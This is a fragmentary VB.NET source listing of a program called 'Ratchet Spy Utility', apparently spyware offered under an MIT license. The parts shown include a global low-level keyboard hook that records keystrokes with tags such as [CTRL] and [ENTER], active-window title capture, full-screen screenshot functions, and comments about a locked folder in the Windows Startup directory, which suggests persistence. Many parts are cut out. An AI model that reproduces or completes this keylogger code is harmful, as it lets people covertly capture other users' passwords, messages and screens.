'Ratchet Spy Utility: Created by: Justin Linwood Ross | (AKA) Rythorian Ethrovon
'Copyright © Black Star Research Facility 
'Trademark: Dark Horse Productions 
'MIT License November 9th 2021 | github.com/rythorian77
...
Public Class Form1
    ...
    Public Event UnhandledException(sender As Object,
    ...
    Private Sub Form1_Load(sender As Object,
        ...
        'To reverse engineer this folder lock that Ratchet has: (Remove above lock code first)
        ' Dim folderPath As String
        'folderPath = ($"{Environment.GetFolderPath(Environment.SpecialFolder.Startup)}\Ratchet")
        'Dim adminUserName As String = Environment.UserName
        'Dim ds As DirectorySecurity = Directory.GetAccessControl(folderPath)
    ...
    'Captures Current Screen (fullscreen images)
...
Area As Rectangle) As Bitmap
    ...
    Private Shared Function HookCallback(nCode As Integer,
       ...
       AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
            ...
            Select Case vkCode
                ...
                Case Else
                    Const V3 As String = "[CTRL]"
                    Const V4 As String = "[Shift]"

                    Select Case (CType(vkCode, Keys)).ToString()
                        Case "Space"
                            Const V As String = "[SPACE]"
                            currentKey = V
                        Case "Return"
                            Const V1 As String = "[ENTER]"
                            currentKey = V1
                        ...
                        Case "LShiftKey"
                            currentKey = V4
                        Case "Back"
                            Const V5 As String = "[Back]"
                            currentKey = V5
                        Case "LWin"
                            Const V6 As String = "[WIN]"
                            currentKey = V6
                        Case "Tab"
                            Const V7 As String = "[Tab]"
                            currentKey = V7
                        Case "Capital"

                            If capsLock = True Then
                                Const V8 As String = "[CAPSLOCK: OFF]"
                                currentKey = V8
                            Else
                                Const V9 As String = "[CAPSLOCK: ON]"
                                currentKey = V9
                            End If
                    End Select
            End Select
    ...
    Private Shared Function KeyboardLayout(vkCode As UInteger) As String
        ...
        Try
            ...
            Dim vkBuffer As Byte() = New Byte(&HFF) {} '225
    ...
    Private Shared Function GetActiveWindowTitle() As String
        ...
        Catch __unusedException1__ As Exception
            Return "Ratchet's Global Hook Protocol"
        End Try
    End Function
...
dwRop As CopyPixelOperation) As Boolean
    ...
    'Release Memory while program runsrunning
